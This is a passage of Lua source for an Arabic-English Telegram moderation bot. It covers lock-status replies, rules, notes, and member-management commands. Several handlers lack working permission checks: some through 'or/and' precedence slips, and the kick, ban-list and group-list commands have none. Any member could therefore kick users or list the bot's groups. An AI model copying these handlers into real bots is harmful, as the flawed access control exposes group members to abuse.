.."❗️🚸 ⌯ ٱڵبوتٱت ⌯» "..mute_bots.."\n"
.."❗️🗯 ⌯ ٱڵشٱرحه ⌯» "..mute_cmd.."\n"
.."❗️🎨 ⌯ ٱڵمتحركه ⌯» "..mute_gifs.."\n"
.."❗️🎭 ⌯ ٱڵمڵصقٱت ⌯» "..lock_sticker.."\n"
.."❗️🗂 ⌯ ٱڵمڵفٱت ⌯» "..lock_file.."\n"
.."❗️🔖 ⌯ ٱڵصور ⌯» "..mute_photo.."\n"
.."❗️🎬 ⌯ ٱڵفيديو ⌯» "..mute_video.."\n"
.."❗️🖲 ⌯ ٱلٱونلٱين ⌯» "..mute_in.."\n"
.."❗️💬 ⌯ ٱڵدردشه ⌯» "..mute_text.."\n"
.."❗️🧬 ⌯ ٱڵتوجيه ⌯» "..lock_forward.."\n"
.."❗️🎧 ⌯ ٱلٱغٱني ⌯» "..mute_music.."\n"
.."❗️🎤 ⌯ ٱڵصوت ⌯» "..mute_voice.."\n"
.."❗️📟 ⌯ ٱڵجهات ⌯» "..lock_contact.."\n"
.."❗️🕹 ⌯ ٱڵمٱركدٱون ⌯» "..markdown.."\n"
.."❗️⚙️ ⌯ ٱڵحمٱيه ⌯» "..strict.."\n"
.."❗️🔖 ⌯ ٱڵهٱشتٱك ⌯» "..lock_htag.."\n"
.."❗️🛠 ⌯ ٱڵتعديل ⌯» "..mute_edit.."\n"
.."❗️🔱 ⌯ ٱڵتثبيت ⌯» "..lock_pin.."\n"
.."❗️🥁 ⌯ ٱلٱشعٱرٱت ⌯» "..lock_tgservice.."\n"
.."❗️📑 ⌯ ٱڵكلٱيش ⌯» "..lock_spam.."\n"
.."❗️📶 ⌯ ٱڵشبكٱت ⌯» "..lock_wp.."\n"
.."❗️📱 ⌯ ٱڵموٱقع ⌯» "..lock_location.."\n"
.."❗️📕 ⌯ ٱڵعربيه ⌯» "..lock_arabic.."\n"
.."❗️📘 ⌯ ٱلٱنكڵيزيه ⌯» "..lock_english.."\n"
.."❗️🧿 ⌯ ٱڵكل⌯» "..mute_all.."\n"
.."❗️🖇 ⌯ ٱڵتكرٱر ⌯» "..mute_flood.."\n"
.."❗️🧷 ⌯ خٱصية ٱڵتكرٱر ⌯» "..floodstatus.."\n"
.."❗️📎 ⌯ عدد ٱڵتكرٱر ⌯» [ "..flood_m.." ]\n"
.."️❗️🧮 ⌯ عدد ٱڵسبٱم ⌯» [ "..spam_c.." ]\n"
.."〰️➖〰️➖〰️➖〰️➖〰️\n❗️🏵 ⌯ CH ⌯» [@loolIQ]\n"
local TXTEN = "⚙ Group Settings :\n\n"
.."◾️ *Strict Mode* : "..strict.."\n"
.."◾️ *Group lock All* : "..mute_all.."\n"
.."◾️ *Case of no answer* : "..mute_cmd.."\n\n"
.."⚠️ *Centerial Settings* :\n\n"
.."◾️ *Lock Spam* : "..lock_spam.."\n"
.."◾️ *Lock Links* : "..mute_links.."\n"
.."️◾️ *Lock Web-Page* :  "..lock_wp.."\n"
.."◾️ *Lock Tag* : "..lock_tag.."\n"
.."️◾️ *Lock abstag* : "..lock_htag.."\n"
.."◾️ *Lock Forward* : "..lock_forward.."\n"
.."◾️ *Lock Bots* :  "..mute_bots.."\n"
.."️◾️ *Lock Edit* :  "..mute_edit.."\n"
.."️◾️ *Lock Pin* : "..lock_pin.."\n"
.."◾️ *Lock Inline* : "..mute_in.."\n"
.."◾️ *Lock arabic* :  "..lock_arabic.."\n"
.."◾️ *Lock English* : "..lock_english.."\n"
.."◾️ *Lock MarkDown* : "..markdown.."\n"
.."️◾️ *Lock TgService* : "..lock_tgservice.."\n"
.."◾️ *Lock Flood* : "..mute_flood.."\n"
.."◾️ *Flood Status* : "..floodstatus.."\n"
.."◾️ *Flood Sensitivity* : [ "..flood_m.." ]\n"
.."️◾️ *Spam Sensitivity* : [ "..spam_c.." ]\n\n"
.." 🔇 *Media Settings* :\n\n"
.."◽️ *Lock Text* : "..mute_text.."\n"
.."◽️ *Lock Photo* : "..mute_photo.."\n"
.."◽️ *Lock Videos* : "..mute_video.."\n"
.."◽️ *Lock Gifs* : "..mute_gifs.."\n"
.."◽️ *Lock Music* : "..mute_music.."\n"
.."◽️ *Lock Voice* : "..mute_voice.."\n"
.."◽️ *Lock File* : "..lock_file.."\n"
.."◽️ *Lock Sticker* : "..lock_sticker.."\n"
.."◽️ *Lock Contact* : "..lock_contact.."\n"
.."️◽️ *Lock location* : "..lock_location.."\n"
TXTEN = TXTEN:gsub("yse✅","yse✅")
TXTEN = TXTEN:gsub("#no","'no'")
TXTEN = TXTEN:gsub("بالحذف","Deleting")
TXTEN = TXTEN:gsub("بالطرد","Kicking")
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTEN, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end
end
end
--     Source loolIQ     --
if text:match("^كول (.*)$")  then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abs(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
--     Source loolIQ     --
if (text and text == 'enable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Reply bot is already enabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ رډوډ ٱڵـبوت ،بٱڵتاكيد ،مۧفعڵـة ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Reply bot has been enable*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ رډوډ ٱڵـبوت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:del(loolIQ..'bot:rep:mute'..msg.chat_id_)
end
end
end
if (text and text == 'disable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Reply bot is already disabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ رډوډ ٱڵـبوت ،بٱڵتاكيد ،مۧعطڵـة ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ *Reply bot has been disabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ رډوډ ٱڵـبوت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:set(loolIQ..'bot:rep:mute'..msg.chat_id_,true)
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etrules (.*)$") then
local txt = {string.match(text, "^([Ss]etrules) (.*)$")}
DevAbs:set(loolIQ..'bot:rules'..msg.chat_id_, txt[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group rules has been saved ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع قوٱنين ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end end
if text:match("^ضع قوانين (.*)$") then
local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
DevAbs:set(loolIQ..'bot:rules'..msg.chat_id_, txt[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group rules has been saved ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم وضع قوٱنين ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end end end
if text:match("^[Rr]ules$") or text:match("^القوانين$") then
local rules = DevAbs:get(loolIQ..'bot:rules'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source loolIQ     --
if text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
DevAbs:set(loolIQ..'owner:note1', txt[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Saved ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حفظ ٱڵملٱحظه ٱرسل جڵب ٱڵملٱحظة ڵعرضهٱ ', 1, 'md')
end end
if text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = DevAbs:get(loolIQ..'owner:note1')
Dev_Abs(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
--     Source loolIQ     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رد الخاص$") then
if DevAbs:get(loolIQ..'clerk') == "On" then
clerken = "Active"
clerkar = "مـفعـۧڵ"
elseif DevAbs:get(loolIQ..'clerk') == "Off" then
clerken = "Deactive"
clerkar = "مـعطـۧڵ"
elseif not DevAbs:get(loolIQ..'clerk') then
clerken = "Deactive"
clerkar = "مـعطـۧڵ"
end
local ABS_PROX = "\n"
.."❗️🧩 ⌯ رد ٱڵخاص ⌯» "..clerkar.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المغادره التلقائيه$") then
if DevAbs:get(loolIQ..'autoleave') == "On" then
autoleaveen = "Active"
autoleavear = "مـفعـۧڵة"
elseif DevAbs:get(loolIQ..'autoleave') == "Off" then
autoleaveen = "Deactive"
autoleavear = "مـعطـۧڵة"
elseif not DevAbs:get(loolIQ..'autoleave') then
autoleaveen = "Deactive"
autoleavear = "مـعطـۧڵة"
end
local ABS_PROX = "\n"
.."❗️🧩 ⌯ ٱڵمغٱدرة ٱڵتڵقٱئية ⌯» "..autoleavear.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الروابط$") then
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفڵه'
else
mute_links = 'مفتوحه'
end
local ABS_PROX = "\n"
.."❗️🧩 ⌯ ٱڵروٱبط ⌯» "..mute_links.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المعرف$") or text:match("^المعرفات$") then
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
lock_tag = 'مـقفۄڵة'
else
lock_tag = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️♟ ⌯ ٱڵمعرف ⌯» "..lock_tag.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^البوتات$") then
if DevAbs:get(loolIQ..'bot:bots:ban'..msg.chat_id_) then
mute_bots = 'مـقفۄڵة'
else
mute_bots = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🚸 ⌯ ٱڵبوتٱت ⌯» "..mute_bots.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الشارحه$") then
if DevAbs:get(loolIQ..'bot:cmds'..msg.chat_id_) then
mute_cmd = 'مـقفۄڵة'
else
mute_cmd = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🗯 ⌯ ٱڵشٱرحه ⌯» "..mute_cmd.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المتحركه$") or text:match("^الملصقات المتحركه$") then
if DevAbs:get(loolIQ..'bot:gifs:mute'..msg.chat_id_) then
mute_gifs = 'مـقفۄڵة'
else
mute_gifs = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🎨 ⌯ ٱڵمتحركه ⌯» "..mute_gifs.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الملصقات$") then
if DevAbs:get(loolIQ..'bot:sticker:mute'..msg.chat_id_) then
lock_sticker = 'مـقفۄڵة'
else
lock_sticker = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🎭 ⌯ ٱڵمڵصقٱت ⌯» "..lock_sticker.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الملفات$") then
if DevAbs:get(loolIQ..'bot:document:mute'..msg.chat_id_) then
lock_file = 'مـقفۄڵة'
else
lock_file = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🗂 ⌯ ٱڵمڵفٱت ⌯» "..lock_file.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الصور$") then
if DevAbs:get(loolIQ..'bot:photo:mute'..msg.chat_id_) then
mute_photo = 'مـقفۄڵة'
else
mute_photo = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🔖 ⌯ ٱڵصور ⌯» "..mute_photo.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الفيديو$") or text:match("^الفيديوهات$") then
if DevAbs:get(loolIQ..'bot:video:mute'..msg.chat_id_) then
mute_video = 'مـقفۄڵة'
else
mute_video = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🎬 ⌯ ٱڵفيديو ⌯» "..mute_video.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الاونلاين$") then
if DevAbs:get(loolIQ..'bot:inline:mute'..msg.chat_id_) then
mute_in = 'مقفڵ'
else
mute_in = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🖲 ⌯ ٱلٱونلٱين ⌯» "..mute_in.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الدردشه$") then
if DevAbs:get(loolIQ..'bot:text:mute'..msg.chat_id_) then
mute_text = 'مقفڵة'
else
mute_text = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️💬 ⌯ ٱڵدردشه ⌯» "..mute_text.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^التوجيه$") or text:match("^اعاده التوجيه$") then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
lock_forward = 'مقفڵ'
else
lock_forward = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🧬 ⌯ ٱڵتوجيه ⌯» "..lock_forward.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الاغاني$") then
if DevAbs:get(loolIQ..'bot:music:mute'..msg.chat_id_) then
mute_music = 'مـقفۄڵة'
else
mute_music = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🎧 ⌯ ٱلٱغٱني ⌯» "..mute_music.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الصوت$") or text:match("^الصوتيات$") then
if DevAbs:get(loolIQ..'bot:voice:mute'..msg.chat_id_) then
mute_voice = 'مـقفۄڵ'
else
mute_voice = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🎤 ⌯ ٱڵصوت ⌯» "..mute_voice.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الجهات$") or text:match("^جهات الاتصال$") then
if DevAbs:get(loolIQ..'bot:contact:mute'..msg.chat_id_) then
lock_contact = 'مـقفۄڵة'
else
lock_contact = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📟 ⌯ ٱڵجهات ⌯» "..lock_contact.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الماركداون$") then
if DevAbs:get(loolIQ..'markdown:lock'..msg.chat_id_) then
markdown = 'مقفڵ'
else
markdown = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🕹 ⌯ ٱڵمٱركدٱون ⌯» "..markdown.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الحمايه$") then
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
strict = 'مـقفۄڵة'
else
strict = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️⚙️ ⌯ ٱڵحمٱيه ⌯» "..strict.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الهاشتاك$") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
lock_htag = 'مقفڵ'
else
lock_htag = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🔖 ⌯ ٱڵهٱشتٱك ⌯» "..lock_htag.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^التعديل$") then
if DevAbs:get(loolIQ..'editmsg'..msg.chat_id_) then
mute_edit = 'مقفڵ'
else
mute_edit = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🛠 ⌯ ٱڵتعديل ⌯» "..mute_edit.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^التثبيت$") then
if DevAbs:get(loolIQ..'bot:pin:mute'..msg.chat_id_) then
lock_pin = 'مقفڵ'
else
lock_pin = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🔱 ⌯ ٱڵتثبيت ⌯» "..lock_pin.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الاشعارات$") then
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
lock_tgservice = 'مـقفۄڵة'
else
lock_tgservice = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🥁 ⌯ ٱلٱشعٱرٱت ⌯» "..lock_tgservice.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الكلايش$") then
if DevAbs:get(loolIQ..'bot:spam:mute'..msg.chat_id_) then
lock_spam = 'مـقفۄڵة'
else
lock_spam = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📑 ⌯ ٱڵكلٱيش ⌯» "..lock_spam.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الشبكات$") then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
lock_wp = 'مـقفۄڵة'
else
lock_wp = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📶 ⌯ ٱڵشبكٱت ⌯» "..lock_wp.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المواقع$") then
if DevAbs:get(loolIQ..'bot:location:mute'..msg.chat_id_) then
lock_location = 'مـقفۄڵة'
else
lock_location = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📱 ⌯ ٱڵموٱقع ⌯» "..lock_location.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^العربيه$") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
lock_arabic = 'مـقفۄڵة'
else
lock_arabic = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📕 ⌯ ٱڵعربيه ⌯» "..lock_arabic.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الانكليزيه$") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
lock_english = 'مـقفۄڵة'
else
lock_english = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️📘 ⌯ ٱلٱنكڵيزيه ⌯» "..lock_english.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الكل$") then
if DevAbs:get(loolIQ..'bot:muteall'..msg.chat_id_) then
mute_all = 'مقفڵه'
else
mute_all = 'مفتوحة'
end
local ABS_PROX = "\n"
.."❗️🧿 ⌯ ٱڵكل⌯» "..mute_all.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^التكرار$") then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
mute_flood = 'مقفڵ'
else
mute_flood = 'مفتوح'
end
local ABS_PROX = "\n"
.."❗️🖇 ⌯ ٱڵتكرٱر ⌯» "..mute_flood.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group name has been changed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تغيير ٱسم ٱڵـمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^ضع صوره$") or text:match("^وضع صوره$")  and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '️❗️🎢 Plese send group photo ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎢 أرسَل صوٌرة المجًموًعة الجٌدَيدة الًان ', 1, 'md')
end
DevAbs:set(loolIQ..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source loolIQ     --
if text:match('^gplist$') or text:match('^المجموعات$') then
local list = DevAbs:smembers(loolIQ.."bot:groups")
local t = '❗️🎒 ⌯ مجموعٱت ٱڵـبوت : \n'
for k,v in pairs(list) do
t = t..k.." • {`"..v.."`}\n" 
end
if #list == 0 then
t = '❗️📛 ⌯ لٱ يوجد مجموعٱت مفعڵة '
end
Dev_Abs(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
--     Source loolIQ     --
if text:match("^الغاء تثبيت$") or text:match("^الغاء التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم ٱڵـغٱء تثبيت ٱڵـرسالة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
--     Source loolIQ     --
if text:match("^اعاده تثبيت$") or text:match("^اعاده التثبيت$") or text:match("^اعادة التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = DevAbs:get(loolIQ..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم ٱعـٱدة تثبيت ٱڵـرسالة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
else
end
end       
--     Source loolIQ     --
if text:match("^kick delete$") or text:match("^طرد الحسابات المحذوفه$") then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
Dev_Abs(msg.chat_id_, msg.id_, 0,'❗️☻ تـۖم طرد ٱڵـحسٱبٱت ٱڵـمحذوفة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     Source loolIQ     --
if text:match("^clean kicked$") or text:match("^تنظيف قائمه الحظر$") then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abs(msg.chat_id_, msg.id_, 0,'❗️📛 ⌯ لٱ يوجد محظورين في ٱڵـمجموعة', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
x = x + 1
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
end
Dev_Abs(msg.chat_id_, msg.id_, 0,'❗️☻ تـۖم تـنظيـۧف قٱئمة ٱڵـحظر \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
--     Source loolIQ     --
if text:match("^(gpinfo)$") or text:match("^معلومات المجموعه$") then
function gpinfo(arg,data)
-- vardump(data) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🧩 ⌯ ٱيـدي ٱڵـمجموعة :( '..msg.chat_id_..' )\n❗️🦠 ⌯ عدد ٱلٱعضٱء : ( *'..data.member_count_..'* )\n❗️⚜️ ⌯ عدد ٱلٱدمنية : ( *'..data.administrator_count_..'* )\n❗️⚠️ ⌯ عدد ٱڵـمحظورين : ( *'..data.kicked_count_..'* )\n〰️➖〰️➖〰️➖〰️➖〰️\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
--     Source loolIQ     --
if text:match('^كشف (-%d+)') then
local chattid = text:match('كشف (-%d+)') 
if not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطورين فقط ', 1, 'md')
else
function abs_c9(arg,data)
function ABS_PROX(f1,f2)
function loolIQ3(t1,t2)
local list = DevAbs:smembers(loolIQ.."abs:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = DevAbs:get(loolIQ.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then
monsh = user_info
else
monsh = "لا يوجد"
end
local Monsh = DevAbs:scard(loolIQ.."abs:monsh:" .. chattid) or "0"
local Baned = DevAbs:scard(loolIQ.."bot:banned:" .. chattid) or "0"
local Owner = DevAbs:scard(loolIQ.."abs:owners:" .. chattid) or "0"
local Muted = DevAbs:scard(loolIQ.."bot:muted:" .. chattid) or "0"
local Tkeed = DevAbs:scard(loolIQ.."bot:keed:" .. chattid) or "0"
local Momod = DevAbs:scard(loolIQ.."abs:admins" .. chattid) or "0"
local Vip = DevAbs:scard(loolIQ.."abs:vipmem" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
